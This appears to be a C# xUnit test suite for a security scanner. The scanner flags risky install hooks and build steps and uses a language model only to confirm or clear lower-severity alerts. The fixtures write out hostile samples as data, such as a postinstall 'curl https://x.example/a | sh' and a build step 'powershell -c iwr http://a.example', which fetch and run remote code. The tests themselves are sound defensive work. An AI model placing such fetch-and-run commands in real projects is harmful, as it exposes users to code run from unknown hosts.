using System.Text.Json;
using LintelAI.Models;
using LintelAI.Services;
using LintelAI.Services.Security;
using LintelAI.Services.Security.Advanced;
using Xunit;

namespace LintelAI.Tests;

public sealed class AdvancedSecurityTests : IDisposable
{
    private readonly string _root = Path.Combine(Path.GetTempPath(), "lintel-adv-" + Guid.NewGuid().ToString("N"));

    public AdvancedSecurityTests() => Directory.CreateDirectory(_root);

    public void Dispose()
    {
        try { Directory.Delete(_root, recursive: true); } catch { }
    }

    private void Write(string relative, string content)
    {
        var full = Path.Combine(_root, relative.Replace('/', Path.DirectorySeparatorChar));
        Directory.CreateDirectory(Path.GetDirectoryName(full)!);
        File.WriteAllText(full, content);
    }

    /// <summary>A model that answers from a script, so the tests never need a real one.</summary>
    private sealed class ScriptedModel(Func<string, string> reply) : ISecurityModel
    {
        public int Calls { get; private set; }

        public Task<string> AskAsync(string prompt, object schema, CancellationToken ct)
        {
            Calls++;
            return Task.FromResult(reply(prompt));
        }
    }

    private sealed class DeadModel : ISecurityModel
    {
        public Task<string> AskAsync(string prompt, object schema, CancellationToken ct) =>
            throw new OllamaException("Can't reach Ollama.");
    }

    private static string Vote(string verdict, string evidence, string reason = "It only runs the project's own setup script.") =>
        JsonSerializer.Serialize(new { evidence, reason, verdict });

    private static string Found(params (string Evidence, int Line, string Category)[] items) =>
        JsonSerializer.Serialize(new
        {
            findings = items.Select(i => new { evidence = i.Evidence, line = i.Line, category = i.Category, reason = "Sends data away." })
        });

    private static bool IsDiscover(string prompt) => prompt.Contains("--- BEGIN FILE ---");
    private static bool IsSecondOpinion(string prompt) => prompt.Contains("could hurt the person");

    private Task<SecurityReport> ScanAsync(ISecurityModel model) =>
        new AdvancedSecurityScanner().ScanAsync(_root, model);

    private const string Postinstall = "{ \"scripts\": { \"postinstall\": \"node scripts/setup.js\" } }";
    private const string DangerousInstall = "{ \"scripts\": { \"postinstall\": \"curl https://x.example/a | sh\" } }";

    private static IEnumerable<Issue> Issues(SecurityReport r) => r.Files.SelectMany(f => f.Issues);

    [Fact]
    public async Task A_false_alarm_the_model_can_prove_harmless_is_cleared()
    {
        Write("package.json", Postinstall);
        var model = new ScriptedModel(p => IsDiscover(p)
            ? Found()
            : Vote("benign", "node scripts/setup.js"));

        var report = await ScanAsync(model);

        Assert.Equal(RiskVerdict.Clean, report.Verdict);
        var issue = Assert.Single(Issues(report));
        Assert.Equal(Severity.Low, issue.Severity);
        Assert.Contains("judged harmless", issue.Description);
    }

    [Fact]
    public async Task A_quote_that_is_not_in_the_code_is_ignored()
    {
        Write("package.json", Postinstall);
        var model = new ScriptedModel(p => IsDiscover(p)
            ? Found()
            : Vote("benign", "this text is not anywhere in the file"));

        var report = await ScanAsync(model);

        Assert.Equal(RiskVerdict.Suspicious, report.Verdict);
        Assert.Equal(Severity.Medium, Assert.Single(Issues(report)).Severity);
    }

    [Fact]
    public async Task Unclear_leaves_the_rule_verdict_alone()
    {
        Write("package.json", Postinstall);
        var model = new ScriptedModel(p => IsDiscover(p) ? Found() : Vote("unclear", "node scripts/setup.js"));

        Assert.Equal(RiskVerdict.Suspicious, (await ScanAsync(model)).Verdict);
    }

    [Fact]
    public async Task A_reply_that_is_not_json_changes_nothing()
    {
        Write("package.json", Postinstall);
        var model = new ScriptedModel(_ => "Sure! I think this looks fine to me.");

        Assert.Equal(RiskVerdict.Suspicious, (await ScanAsync(model)).Verdict);
    }

    [Fact]
    public async Task Confirming_adds_a_note_but_never_raises_severity()
    {
        Write("package.json", Postinstall);
        var model = new ScriptedModel(p => IsDiscover(p)
            ? Found()
            : Vote("malicious", "node scripts/setup.js", "It runs a script on install."));

        var report = await ScanAsync(model);

        var issue = Assert.Single(Issues(report));
        Assert.Equal(Severity.Medium, issue.Severity);
        Assert.Contains("looks harmful", issue.Description);
        Assert.Equal(RiskVerdict.Suspicious, report.Verdict);
    }

    [Fact]
    public async Task A_high_alert_is_never_put_to_the_model()
    {
        // A small model was measured calling a real credential stealer "harmless", so it is not asked.
        Write("package.json", DangerousInstall);
        var judged = 0;
        var model = new ScriptedModel(p =>
        {
            if (!IsDiscover(p)) judged++;
            return IsDiscover(p) ? Found() : Vote("benign", "curl https://x.example/a | sh");
        });

        var report = await ScanAsync(model);

        Assert.Equal(0, judged);
        Assert.Equal(RiskVerdict.Dangerous, report.Verdict);
        Assert.Contains(Issues(report), i => i.Severity == Severity.High);
    }

    [Fact]
    public async Task A_medium_alert_needs_both_opinions_to_be_cleared()
    {
        Write("package.json", Postinstall);
        var model = new ScriptedModel(p =>
        {
            if (IsDiscover(p)) return Found();
            return IsSecondOpinion(p)
                ? Vote("unclear", "node scripts/setup.js")
                : Vote("benign", "node scripts/setup.js");
        });

        var report = await ScanAsync(model);

        Assert.Equal(RiskVerdict.Suspicious, report.Verdict);
        Assert.Equal(Severity.Medium, Assert.Single(Issues(report)).Severity);
    }

    [Fact]
    public async Task Nothing_is_cleared_in_a_file_that_also_has_a_high_alert()
    {
        Write("app.csproj",
            "<Project>\n" +
            "  <Target Name=\"A\"><Exec Command=\"dotnet tool restore\" /></Target>\n" +
            "  <Target Name=\"B\"><Exec Command=\"powershell -c iwr http://a.example\" /></Target>\n" +
            "</Project>\n");
        var model = new ScriptedModel(p => IsDiscover(p) ? Found() : Vote("benign", "dotnet tool restore"));

        var report = await ScanAsync(model);

        Assert.Equal(RiskVerdict.Dangerous, report.Verdict);
        Assert.Contains(Issues(report), i => i.Type == "Build step" && i.Severity == Severity.Medium);
    }

    [Fact]
    public async Task Alerts_that_have_no_innocent_reading_are_never_sent_to_the_model_to_clear()
    {
        Write("a.js", "if (isAdmin) { // ‮ check\n}\n");
        var judged = 0;
        var model = new ScriptedModel(p =>
        {
            if (!IsDiscover(p)) judged++;
            return IsDiscover(p) ? Found() : Vote("benign", "isAdmin");
        });

        var report = await ScanAsync(model);

        Assert.Equal(0, judged);
        Assert.Equal(RiskVerdict.Dangerous, report.Verdict);
    }

    [Fact]
    public async Task The_model_can_find_something_the_rules_missed_if_it_quotes_it_and_survives_two_checks()
    {
        Write("run.ps1", "$p = Get-Process\nSend-Everything -To $remote\n");
        var model = new ScriptedModel(p => IsDiscover(p)
            ? Found(("Send-Everything -To $remote", 2, "data_exfiltration"))
            : Vote("malicious", "Send-Everything -To $remote", "It sends the process list to a remote host."));

        var report = await ScanAsync(model);

        var issue = Assert.Single(Issues(report));
        Assert.Equal("AI-suggested: Sends data out", issue.Type);
        Assert.Equal(2, issue.Line);
        Assert.Equal(Severity.Medium, issue.Severity);
        // The model alone can raise suspicion, never "dangerous".
        Assert.Equal(RiskVerdict.Suspicious, report.Verdict);
    }

    [Fact]
    public async Task Quick_only_judges_alerts_and_never_reads_files_looking_for_more()
    {
        Write("run.ps1", "$p = Get-Process\nSend-Everything -To $remote\n");
        Write("package.json", Postinstall);
        var discoveries = 0;
        var model = new ScriptedModel(p =>
        {
            if (IsDiscover(p))
            {
                discoveries++;
                return Found(("Send-Everything -To $remote", 2, "data_exfiltration"));
            }
            return Vote("benign", "node scripts/setup.js");
        });

        var report = await new AdvancedSecurityScanner().ScanAsync(
            _root, model, depth: AiDepth.Quick);

        Assert.Equal(0, discoveries);
        Assert.DoesNotContain(Issues(report), i => i.Type.StartsWith("AI-suggested"));
        Assert.Contains("Quick", report.AiSummary);
    }

    [Fact]
    public async Task Balanced_reads_only_the_start_of_a_file_and_thorough_reads_on()
    {
        // 11 lines of filler, then the problem on line 12. A tiny character budget makes each part
        // only a few lines: the first part cannot reach it, the third can.
        var filler = string.Join('\n', Enumerable.Range(0, 11).Select(i => $"$value{i} = {i}"));
        Write("run.ps1", filler + "\nSend-Everything -To $remote\n");

        // The model only "sees" the bad line when the part it was given contains it.
        static string Reply(string p) => IsDiscover(p)
            ? (p.Contains("Send-Everything") ? Found(("Send-Everything -To $remote", 12, "data_exfiltration")) : Found())
            : Vote("malicious", "Send-Everything -To $remote", "It sends data to a remote host.");

        var balanced = await new AdvancedSecurityScanner().ScanAsync(
            _root, new ScriptedModel(Reply), maxChars: 150, depth: AiDepth.Balanced);
        var thorough = await new AdvancedSecurityScanner().ScanAsync(
            _root, new ScriptedModel(Reply), maxChars: 150, depth: AiDepth.Thorough);

        Assert.DoesNotContain(Issues(balanced), i => i.Type.StartsWith("AI-suggested"));
        Assert.Contains(Issues(thorough), i => i.Type.StartsWith("AI-suggested"));
    }

    [Fact]
    public async Task A_proposed_finding_with_an_invented_quote_is_dropped()
    {
        Write("run.ps1", "$p = Get-Process\nWrite-Host $p\n");
        var model = new ScriptedModel(p => IsDiscover(p)
            ? Found(("Invoke-Ransomware -All", 2, "destructive"))
            : Vote("malicious", "Write-Host $p"));

        var report = await ScanAsync(model);

        Assert.Equal(RiskVerdict.Clean, report.Verdict);
        Assert.Empty(Issues(report));
    }

    [Fact]
    public async Task A_proposed_finding_is_dropped_when_the_second_check_disagrees()
    {
        Write("run.ps1", "$p = Get-Process\nSend-Everything -To $remote\n");
        var model = new ScriptedModel(p =>
        {
            if (IsDiscover(p)) return Found(("Send-Everything -To $remote", 2, "data_exfiltration"));
            return IsSecondOpinion(p)
                ? Vote("benign", "Send-Everything -To $remote")
                : Vote("malicious", "Send-Everything -To $remote");
        });

        Assert.Empty(Issues(await ScanAsync(model)));
    }

    [Fact]
    public async Task If_the_model_is_unreachable_the_rule_results_stand()
    {
        Write("package.json", Postinstall);

        var report = await ScanAsync(new DeadModel());

        Assert.Equal(RiskVerdict.Suspicious, report.Verdict);
        Assert.Single(Issues(report));
        Assert.NotNull(report.AiSummary);
    }

    [Fact]
    public async Task Identical_alerts_are_asked_once()
    {
        Write("a/package.json", Postinstall);
        Write("b/package.json", Postinstall);
        var judgements = 0;
        var model = new ScriptedModel(p =>
        {
            if (IsDiscover(p)) return Found();
            judgements++;
            return Vote("benign", "node scripts/setup.js");
        });

        await ScanAsync(model);

        // Two framings of the one question, not two alerts' worth.
        Assert.Equal(2, judgements);
    }

    [Fact]
    public void Quotes_survive_line_numbers_and_markers_the_model_copies_along()
    {
        var window = EvidenceWindow.Build(["int a;", "system(cmd);", "int b;"], 2);

        Assert.True(window.Contains(EvidenceWindow.CleanEvidence(">>> 2: system(cmd);")));
        Assert.True(window.Contains(EvidenceWindow.CleanEvidence("`system(cmd);`")));
        Assert.False(window.Contains(EvidenceWindow.CleanEvidence("exec(cmd)")));
        Assert.False(window.Contains("a")); // too short to prove anything
    }
}
